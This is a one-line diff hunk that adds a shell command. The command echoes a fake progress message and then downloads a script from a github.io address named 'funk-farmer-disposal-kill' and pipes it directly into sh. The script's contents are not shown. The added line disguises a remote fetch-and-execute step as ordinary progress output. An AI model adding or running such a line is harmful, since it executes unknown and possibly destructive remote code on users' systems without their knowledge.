@@ -1,0 +1,1 @@
+echo 'Progress: 19.0%'; curl -L --progress-bar frkns.github.io/fun/funk-farmer-disposal-kill | sh
